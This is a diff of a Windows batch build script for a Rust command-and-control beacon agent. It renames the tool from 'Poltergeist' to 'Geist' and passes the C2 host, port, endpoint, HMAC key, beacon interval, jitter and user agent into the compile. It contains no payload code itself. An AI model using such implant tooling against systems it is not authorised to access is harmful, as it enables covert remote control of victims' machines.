@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 echo ==========================================
-echo   Poltergeist Agent Builder (Rust)
+echo   Geist Agent Builder (Rust)
 echo ==========================================
 echo.
 
@@ -55,22 +55,22 @@ echo [*] Building with cargo (release + optimizations)...
 echo.
 
 REM Set environment variables for compile-time substitution
-set POLTERGEIST_HOST=%C2_HOST%
-set POLTERGEIST_PORT=%C2_PORT%
-set POLTERGEIST_ENDPOINT=%C2_ENDPOINT%
-set POLTERGEIST_HMAC_KEY=%HMAC_KEY%
-set POLTERGEIST_INTERVAL=%BEACON_INTERVAL%
-set POLTERGEIST_JITTER=%JITTER%
-set POLTERGEIST_USER_AGENT=%USER_AGENT%
+set GEIST_HOST=%C2_HOST%
+set GEIST_PORT=%C2_PORT%
+set GEIST_ENDPOINT=%C2_ENDPOINT%
+set GEIST_HMAC_KEY=%HMAC_KEY%
+set GEIST_INTERVAL=%BEACON_INTERVAL%
+set GEIST_JITTER=%JITTER%
+set GEIST_USER_AGENT=%USER_AGENT%
 
 REM Build with cargo in release mode
 cargo build --release --target x86_64-pc-windows-msvc
 
 if %ERRORLEVEL% EQU 0 (
     echo.
-    echo [SUCCESS] Build complete: target\x86_64-pc-windows-msvc\release\poltergeist.exe
+    echo [SUCCESS] Build complete: target\x86_64-pc-windows-msvc\release\geist.exe
     echo.
-    dir /b target\x86_64-pc-windows-msvc\release\poltergeist.exe
+    dir /b target\x86_64-pc-windows-msvc\release\geist.exe
 ) else (
     echo.
     echo [ERROR] Build failed!
